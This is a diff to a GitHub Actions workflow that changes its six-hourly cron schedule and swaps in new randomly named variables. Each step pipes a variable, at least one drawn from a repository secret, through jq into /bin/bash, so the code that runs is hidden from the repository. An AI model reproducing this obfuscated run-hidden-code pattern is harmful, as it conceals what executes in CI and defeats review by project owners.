@@ -1,8 +1,9 @@
 name: yanqing19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 0/6 * * *'
+    - cron: '58 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,10 +12,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: yanqing19871010
         env:
-          pubsx831: ${{ secrets.pubsx831 }}
+          pr9853: ${{ secrets.pr9853 }}
         run: |
-          echo $pubsx831 | jq -r .dkhgb12221 | /bin/bash
-          echo $cri4 | jq -r .ko9 | /bin/bash
-          echo $n9265 | jq -r .pafjv8 | /bin/bash
-          echo $v0524 | jq -r .r50 | /bin/bash
+          echo $pr9853 | jq -r .qmfr40685 | /bin/bash
+          echo $qbfrw77075 | jq -r .b2 | /bin/bash
+          echo $b23150 | jq -r .ki579 | /bin/bash
+          echo $y69092 | jq -r .u05009 | /bin/bash
+          echo $lw789 | jq -r .a58 | /bin/bash
 
